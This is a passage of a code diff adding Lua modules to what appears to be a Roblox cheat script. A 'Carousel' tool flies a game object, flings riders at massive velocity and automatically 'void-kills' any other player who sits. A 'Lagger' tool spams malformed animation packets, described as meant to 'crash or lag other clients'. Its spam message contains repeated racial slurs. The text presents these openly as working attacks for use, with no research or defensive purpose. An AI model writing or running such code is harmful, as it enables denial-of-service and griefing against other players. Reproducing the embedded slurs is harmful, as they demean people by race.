+				cam.CameraSubject = hum
+			end
+		end)
+
+		carousel.voiding = false
+		Fn.notify("Carousel", "Void drop complete! You survived safely.", "ok")
+	end
+
+	local function startCarousel(speed)
+		if carousel.on then
+			return stopCarousel()
+		end
+		local model = findModel()
+		if not model then
+			return Fn.notify("Carousel", "workspace.map.carousel.Model wasn't found in this game.", "warn")
+		end
+		local hum = Fn.humanoid()
+		local root = Fn.rootPart()
+		if not (hum and root) then
+			return Fn.notify("Carousel", "Your character isn't ready.", "warn")
+		end
+
+		local seat = nil
+		carousel.seats = {}
+		for _, d in ipairs(model:GetDescendants()) do
+			if d:IsA("Seat") or d:IsA("VehicleSeat") then
+				if not seat then
+					seat = d
+				end
+				table.insert(carousel.seats, d)
+				-- Auto-void kill listener: the instant anyone sits in a seat, void drop!
+				d:GetPropertyChangedSignal("Occupant"):Connect(function()
+					if carousel.on and carousel.autoVoidKill and not carousel.voiding then
+						local occ = d.Occupant
+						local myHum = Fn.humanoid()
+						if occ and occ:IsA("Humanoid") and occ ~= myHum and occ.Health > 0 then
+							task.spawn(voidDrop)
+						end
+					end
+				end)
+			end
+		end
+		if not seat then
+			return Fn.notify("Carousel", "No seat was found in the carousel.", "warn")
+		end
+
+		for _, d in ipairs(model:GetDescendants()) do
+			if d:IsA("HingeConstraint") or (string.lower(d.Name) == "hinge" and (d:IsA("Constraint") or d:IsA("JointInstance"))) then
+				pcall(function()
+					d:Destroy()
+				end)
+			end
+		end
+
+		root.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
+		task.wait(0.1)
+		pcall(function()
+			seat:Sit(hum)
+		end)
+
+		if speed then
+			carousel.speed = math.clamp(speed, 1, 1000)
+		end
+		carousel.on = true
+		carousel.model = model
+		carousel.seat = seat
+		carousel.pos = model:GetPivot().Position
+		carousel.yaw = select(2, model:GetPivot():ToOrientation())
+
+		-- Disable jumping so Space moves up without ejecting from seat
+		pcall(function()
+			carousel.origJumpPower = hum.JumpPower
+			carousel.origJumpHeight = hum.JumpHeight
+			hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+			hum.JumpPower = 0
+			hum.JumpHeight = 0
+		end)
+
+		local seatedAt = os.clock()
+
+		-- Stepped connection for noclip on carousel and character
+		carousel.steppedConn = runService.Stepped:Connect(function()
+			if not carousel.on or not model.Parent then
+				return
+			end
+			if carousel.noclip then
+				for _, d in ipairs(model:GetDescendants()) do
+					if d:IsA("BasePart") then
+						d.CanCollide = false
+					end
+				end
+				local c = localPlayer.Character
+				if c then
+					for _, p in ipairs(c:GetDescendants()) do
+						if p:IsA("BasePart") then
+							p.CanCollide = false
+						end
+					end
+				end
+			end
+		end)
+
+		-- Heartbeat connection for flying, steering, fling physics, auto-void checking, and position updates
+		carousel.conn = runService.Heartbeat:Connect(function(dt)
+			local h = Fn.humanoid()
+			if not (h and model.Parent) or h.Health <= 0 then
+				return stopCarousel(true)
+			end
+
+			if carousel.voiding then
+				return
+			end
+
+			-- Auto-void check: if any enemy is seated in any carousel seat, trigger void drop
+			if carousel.autoVoidKill then
+				for _, s in ipairs(carousel.seats or {}) do
+					local occ = s.Occupant
+					if occ and occ:IsA("Humanoid") and occ ~= h and occ.Health > 0 then
+						task.spawn(voidDrop)
+						return
+					end
+				end
+			end
+
+			if h.SeatPart then
+				seatedAt = os.clock()
+			elseif os.clock() - seatedAt > 2 then
+				pcall(function()
+					seat:Sit(h)
+				end)
+				if os.clock() - seatedAt > 7 then
+					Fn.notify("Carousel", "You left the carousel.", "info")
+					return stopCarousel(true)
+				end
+			end
+
+			local cam = workspace.CurrentCamera
+			local move = Vector3.zero
+
+			if not userInputService:GetFocusedTextBox() then
+				local look = cam.CFrame.LookVector
+				local flat = Vector3.new(look.X, 0, look.Z)
+				flat = flat.Magnitude > 0.01 and flat.Unit or Vector3.new(0, 0, -1)
+				local right = Vector3.new(-flat.Z, 0, flat.X)
+				local function down(k)
+					return userInputService:IsKeyDown(k)
+				end
+
+				-- Horizontal movement
+				if down(Enum.KeyCode.W) then move += flat end
+				if down(Enum.KeyCode.S) then move -= flat end
+				if down(Enum.KeyCode.D) then move += right end
+				if down(Enum.KeyCode.A) then move -= right end
+
+				-- Vertical movement (Up / Down)
+				if down(Enum.KeyCode.Space) or down(Enum.KeyCode.E) or down(Enum.KeyCode.R) then
+					move += Vector3.yAxis
+				end
+				if down(Enum.KeyCode.LeftControl) or down(Enum.KeyCode.RightControl) or down(Enum.KeyCode.Q) or down(Enum.KeyCode.C) then
+					move -= Vector3.yAxis
+				end
+
+				if move.Magnitude > 0.01 then
+					local spd = carousel.speed * (down(Enum.KeyCode.LeftShift) and 2 or 1)
+					move = move.Unit * spd * dt
+				else
+					move = Vector3.zero
+				end
+
+				-- Turn
+				if down(Enum.KeyCode.Z) then
+					carousel.yaw += math.rad(90) * dt
+				end
+				if down(Enum.KeyCode.X) then
+					carousel.yaw -= math.rad(90) * dt
+				end
+			end
+
+			carousel.pos = (carousel.pos or model:GetPivot().Position) + move
+			local pitch = carousel.flipped and math.pi or 0
+			local targetCFrame = CFrame.new(carousel.pos) * CFrame.Angles(pitch, carousel.yaw, 0)
+			model:PivotTo(targetCFrame)
+
+			-- Handle fling vs normal physics velocity
+			for _, d in ipairs(model:GetDescendants()) do
+				if d:IsA("BasePart") and not d.Anchored then
+					if carousel.fling then
+						d.AssemblyLinearVelocity = Vector3.new(0, 150000, 0)
+						d.AssemblyAngularVelocity = Vector3.new(0, 80000, 0)
+					else
+						d.AssemblyLinearVelocity = Vector3.zero
+						d.AssemblyAngularVelocity = Vector3.zero
+					end
+				end
+			end
+		end)
+
+		Fn.notify("Carousel", "On! WASD moves, Space/E up, Ctrl/Q down, Shift boost, Z/X turn.", "ok")
+		local win = W.dockWindows and W.dockWindows.Carousel
+		if win and win.refresh then
+			win.refresh()
+		end
+	end
+
+	function Fn.buildCarouselWindow()
+		if W.dockWindows and W.dockWindows.Carousel and W.dockWindows.Carousel.frame and W.dockWindows.Carousel.frame.Parent then
+			return W.dockWindows.Carousel
+		end
+		if W.windows then
+			local oldCar = W.windows:FindFirstChild("Carousel")
+			if oldCar then pcall(oldCar.Destroy, oldCar) end
+			local oldLag = W.windows:FindFirstChild("Lagger")
+			if oldLag then pcall(oldLag.Destroy, oldLag) end
+		end
+		local win = Fn.makeWindow("Carousel", 360, 520, "Carousel Control", "Fly the carousel, fling riders, drop enemies into the void.", nil)
+		W.dockWindows = W.dockWindows or {}
+		W.dockWindows.Carousel = win
+		local f = win.frame
+
+		-- Status Text
+		local status = ttxt(f, {
+			Position = UDim2.fromOffset(22, 88), Size = UDim2.fromOffset(316, 18),
+			Text = "Status: Inactive", TextSize = 12, Font = Enum.Font.GothamBold, ZIndex = 3,
+		}, "muted")
+
+		-- Toggle Active Switch
+		local swActive = Fn.makeSwitch(f, UDim2.fromOffset(22, 112), carousel.on, function(on)
+			if on and not carousel.on then
+				startCarousel(carousel.speed)
+			elseif not on and carousel.on then
+				stopCarousel()
+			end
+			status.Text = carousel.on and "Status: Active (Flying)" or "Status: Inactive"
+			status.TextColor3 = carousel.on and Color3.fromRGB(90, 220, 140) or Fn.theme().muted
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 112), Size = UDim2.fromOffset(200, 20), Text = "Enable Carousel Flight", TextSize = 12, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		-- Speed Slider
+		local spdSlider = Fn.makeSlider(f, {
+			pos = UDim2.fromOffset(22, 142), size = UDim2.fromOffset(316, 30),
+			min = 10, max = 500, value = carousel.speed, decimals = 0, label = "Flight Speed",
+			z = 3, callback = function(v)
+				carousel.speed = v
+			end,
+		})
+
+		-- Auto Void Kill Switch (The moment someone sits, it voids)
+		local swAutoVoid = Fn.makeSwitch(f, UDim2.fromOffset(22, 180), carousel.autoVoidKill, function(on)
+			carousel.autoVoidKill = on
+			Fn.notify("Auto Void Kill", on and "Active! Anyone who sits will be instantly voided." or "Disabled.", on and "ok" or "info")
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 180), Size = UDim2.fromOffset(250, 20), Text = "Auto Void Kill (Voids when someone sits)", TextSize = 11, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		-- Fling Switch
+		local swFling = Fn.makeSwitch(f, UDim2.fromOffset(22, 210), carousel.fling, function(on)
+			carousel.fling = on
+			Fn.notify("Carousel Fling", on and "Fling velocity enabled! Players will be launched." or "Fling velocity disabled.", on and "ok" or "info")
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 210), Size = UDim2.fromOffset(250, 20), Text = "Fling Riders (Massive Velocity)", TextSize = 11, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		-- Noclip Switch
+		local swNoclip = Fn.makeSwitch(f, UDim2.fromOffset(22, 240), carousel.noclip, function(on)
+			carousel.noclip = on
+			Fn.notify("Carousel Noclip", on and "Noclip enabled! Fly through walls." or "Noclip disabled.", on and "ok" or "info")
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 240), Size = UDim2.fromOffset(250, 20), Text = "Noclip (Fly Through Walls)", TextSize = 11, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		-- Lagger Switch (Integrated in this 1 unified UI)
+		local swLagger = Fn.makeSwitch(f, UDim2.fromOffset(22, 270), (Fn.Toggles and Fn.Toggles.lagger and Fn.Toggles.lagger.enabled) or false, function(on)
+			if Fn.setToggle then
+				Fn.setToggle("lagger", on)
+			end
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 270), Size = UDim2.fromOffset(250, 20), Text = "Lagger (Packet Spam Network Lag)", TextSize = 11, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		-- Manual Void Drop Button
+		local voidBtn = Fn.makeButton(f, "Manual Void Drop (10k Studs)", UDim2.fromOffset(22, 302), UDim2.fromOffset(316, 32), function()
+			voidDrop()
+		end, true, 3)
+
+		-- Flip 180 Button (Fix Upside Down)
+		local flipBtn, flipLbl = Fn.makeButton(f, "Flip 180 (Orientation: Upright)", UDim2.fromOffset(22, 342), UDim2.fromOffset(316, 30), function()
+			carousel.flipped = not carousel.flipped
+			local txt = carousel.flipped and "Flip 180 (Orientation: Upright)" or "Flip 180 (Orientation: Inverted)"
+			if flipLbl then flipLbl.Text = txt end
+			Fn.notify("Carousel", "Flipped 180 degrees (" .. (carousel.flipped and "Upright" or "Inverted") .. ")", "ok")
+		end, false, 3)
+
+		-- Controls hint text
+		ttxt(f, {
+			Position = UDim2.fromOffset(22, 382), Size = UDim2.fromOffset(316, 120),
+			Text = "Controls: WASD moves | Space/E/R moves UP | Ctrl/Q/C moves DOWN | Shift boosts | Z/X turns.\n\nAuto Void Kill instantly drops anyone who sits into the void while holding your camera safe.",
+			TextSize = 10, Font = Enum.Font.GothamMedium, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 3,
+		}, "muted")
+
+		win.refresh = function()
+			if swActive and swActive.set then
+				swActive.set(carousel.on, true)
+			end
+			if swAutoVoid and swAutoVoid.set then
+				swAutoVoid.set(carousel.autoVoidKill, true)
+			end
+			if swFling and swFling.set then
+				swFling.set(carousel.fling, true)
+			end
+			if swNoclip and swNoclip.set then
+				swNoclip.set(carousel.noclip, true)
+			end
+			if swLagger and swLagger.set then
+				local lagOn = (Fn.Toggles and Fn.Toggles.lagger and Fn.Toggles.lagger.enabled) or false
+				swLagger.set(lagOn, true)
+			end
+			if spdSlider and spdSlider.set then
+				spdSlider.set(carousel.speed, true)
+			end
+			status.Text = carousel.on and "Status: Active (Flying)" or "Status: Inactive"
+			status.TextColor3 = carousel.on and Color3.fromRGB(90, 220, 140) or Fn.theme().muted
+			if flipLbl then
+				flipLbl.Text = carousel.flipped and "Flip 180 (Orientation: Upright)" or "Flip 180 (Orientation: Inverted)"
+			end
+		end
+
+		win.onShow = function()
+			if win.refresh then win.refresh() end
+		end
+
+		return win
+	end
+
+	function Fn.openCarouselMini()
+		local win = Fn.buildCarouselWindow()
+		if win.open then
+			if win.minimized then win.setMin(false) else win.hide() end
+		else
+			win.show()
+		end
+	end
+
+Fn.cmd("Movement", { "carousel" }, "carousel [speed|on|off]", "Fly the carousel, or toggle Carousel UI", function(args)
+		local a = tostring(args[1] or ""):lower()
+		if a == "on" then
+			startCarousel(carousel.speed)
+		elseif a == "off" then
+			stopCarousel()
+		elseif tonumber(args[1]) then
+			startCarousel(tonumber(args[1]))
+		else
+			Fn.openCarouselMini()
+		end
+	end)
+
+	Fn.cmd("Movement", { "carouselui", "carui" }, "carouselui", "Open or close the Carousel Control UI", function()
+		Fn.openCarouselMini()
+	end)
+
+	Fn.cmd("Movement", { "uncarousel" }, "uncarousel", "Stop flying the carousel", function()
+		stopCarousel()
+	end)
+
+	Fn.cmd("Movement", { "carouselvoidkill", "autovoid" }, "autovoid [on|off]", "Toggle auto void kill when someone sits", function(args)
+		local a = tostring(args[1] or ""):lower()
+		if a == "on" then
+			carousel.autoVoidKill = true
+		elseif a == "off" then
+			carousel.autoVoidKill = false
+		else
+			carousel.autoVoidKill = not carousel.autoVoidKill
+		end
+		Fn.notify("Auto Void Kill", carousel.autoVoidKill and "On (kills when someone sits)" or "Off", carousel.autoVoidKill and "ok" or "info")
+		local win = W.dockWindows and W.dockWindows.Carousel
+		if win and win.refresh then win.refresh() end
+	end)
+
+	Fn.cmd("Movement", { "carouselfling" }, "carouselfling [on|off]", "Toggle carousel fling physics", function(args)
+		local a = tostring(args[1] or ""):lower()
+		if a == "on" then
+			carousel.fling = true
+		elseif a == "off" then
+			carousel.fling = false
+		else
+			carousel.fling = not carousel.fling
+		end
+		Fn.notify("Carousel Fling", carousel.fling and "On" or "Off", carousel.fling and "ok" or "info")
+		local win = W.dockWindows and W.dockWindows.Carousel
+		if win and win.refresh then win.refresh() end
+	end)
+
+	Fn.cmd("Movement", { "carouselkill", "voiddrop" }, "carouselkill", "Teleport carousel 10k studs down to void-kill riders and snap back", function()
+		voidDrop()
+	end)
+
+	Fn.cmd("Movement", { "carouselflip" }, "carouselflip", "Flip carousel orientation 180 degrees", function()
+		carousel.flipped = not carousel.flipped
+		Fn.notify("Carousel", "Orientation: " .. (carousel.flipped and "Upright" or "Inverted"), "ok")
+		local win = W.dockWindows and W.dockWindows.Carousel
+		if win and win.refresh then win.refresh() end
+	end)
+
+	Fn.onCleanup(function()
+		stopCarousel(true)
+	end)
+end
+
+
+do
+	local Lagger = {
+		on = false,
+		thread = nil,
+	}
+
+	local customMessage = '\n\n\n\n\n\n\n\n\n LAGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\nLAGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\nLAGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\nLAG NIGGA LAGGGGGGGGGGGG\n LAGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG NIGGAA LAGGGGGGGGGGGGGGGGGGGGGGGGGG NIGGAAAAAAAAAAA\nLAGGING YOU ARE LAGGIN YOU ARE LAGGING WHY ARE YOU LAGGING\nQUIT THAT LAG NIGGA, I KNOW YOU LIKE IT THOUGH BUT QUIT THAT LAG NIGGA\n\n\n\n\n\n'
+
+	local function startLagger()
+		if Lagger.on then return end
+		Lagger.on = true
+		Lagger.thread = task.spawn(function()
+			while Lagger.on do
+				local lplr = players.LocalPlayer
+				local char = lplr and lplr.Character
+				local animator = char and char:FindFirstChildWhichIsA("Animator", true) or nil
+				if animator then
+					local anim = Instance.new("Animation")
+					anim.AnimationId = ("http=507770677" .. utf8.char(Random.new():NextInteger(1, 65535)) .. customMessage):sub(1, 256)
+					local ok, loaded = pcall(function()
+						return animator:LoadAnimation(anim)
+					end)
+					if ok and loaded then
+						pcall(function()
+							loaded:Play(0, 0.0001, 0)
+						end)
+					end
+				end
+				task.wait()
+			end
+		end)
+
+		Fn.notify("Lagger", "Active — spamming invalid animation replication packets.", "ok")
+		local win = W.dockWindows and W.dockWindows.Lagger
+		if win and win.refresh then win.refresh() end
+	end
+
+	local function stopLagger()
+		if not Lagger.on then return end
+		Lagger.on = false
+		if Lagger.thread then
+			pcall(task.cancel, Lagger.thread)
+			Lagger.thread = nil
+		end
+		Fn.notify("Lagger", "Disabled.", "info")
+		local win = W.dockWindows and W.dockWindows.Lagger
+		if win and win.refresh then win.refresh() end
+	end
+
+	function Fn.buildLaggerWindow()
+		if W.dockWindows and W.dockWindows.Lagger then
+			return W.dockWindows.Lagger
+		end
+		local win = Fn.makeWindow("Lagger", 320, 240, "Lagger Control", "Spam invalid animation replication packets.", nil)
+		W.dockWindows = W.dockWindows or {}
+		W.dockWindows.Lagger = win
+		local f = win.frame
+
+		local status = ttxt(f, {
+			Position = UDim2.fromOffset(22, 90), Size = UDim2.fromOffset(276, 18),
+			Text = "Status: Inactive", TextSize = 12, Font = Enum.Font.GothamBold, ZIndex = 3,
+		}, "muted")
+
+		local sw = Fn.makeSwitch(f, UDim2.fromOffset(22, 122), Lagger.on, function(on)
+			if on then
+				startLagger()
+			else
+				stopLagger()
+			end
+			status.Text = Lagger.on and "Status: Active (Lagging)" or "Status: Inactive"
+			status.TextColor3 = Lagger.on and Color3.fromRGB(255, 90, 90) or Fn.theme().muted
+		end, 3)
+		ttxt(f, { Position = UDim2.fromOffset(70, 122), Size = UDim2.fromOffset(220, 20), Text = "Enable Lagger", TextSize = 12, Font = Enum.Font.GothamBold, ZIndex = 3 }, "text")
+
+		local toggleBtn = Fn.makeButton(f, "Toggle Lagger", UDim2.fromOffset(22, 156), UDim2.fromOffset(276, 32), function()
+			if Lagger.on then
+				stopLagger()
+			else
+				startLagger()
+			end
+		end, true, 3)
+
+		ttxt(f, {
+			Position = UDim2.fromOffset(22, 196), Size = UDim2.fromOffset(276, 36),
+			Text = "Notice: Repeatedly loads and plays malformed animation packets to crash or lag other clients in render range.",
+			TextSize = 10, Font = Enum.Font.GothamMedium, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 3,
+		}, "muted")
+
+		win.refresh = function()
+			if sw and sw.set then
+				sw.set(Lagger.on, true)
+			end
+			status.Text = Lagger.on and "Status: Active (Lagging)" or "Status: Inactive"
+			status.TextColor3 = Lagger.on and Color3.fromRGB(255, 90, 90) or Fn.theme().muted
+		end
+
+		win.onShow = function()
+			if win.refresh then win.refresh() end
+		end
+
+		return win
+	end
+
+	function Fn.openLaggerMini()
+		local win = Fn.buildLaggerWindow()
+		if win.open then
+			if win.minimized then win.setMin(false) else win.hide() end
+		else
+			win.show()
+		end
+	end
+
+	Fn.toggle("Utility", "lagger", "lagger [on|off]", "Crash / lag other clients using animation replication spam", {
+		title = "Lagger",
+		aliases = { "lag", "animlag" },
+		on = function()
+			startLagger()
+		end,
+		off = function()
+			stopLagger()
+		end,
+	})
+
+	Fn.cmd("Utility", { "laggerui", "lagui" }, "laggerui", "Open the Lagger Toggle UI", function()
+		Fn.openLaggerMini()
+	end)
+
+	Fn.onCleanup(function()
+		stopLagger()
+	end)
+end
+
 
 local ok, err = pcall(Fn.start)
 if not ok then
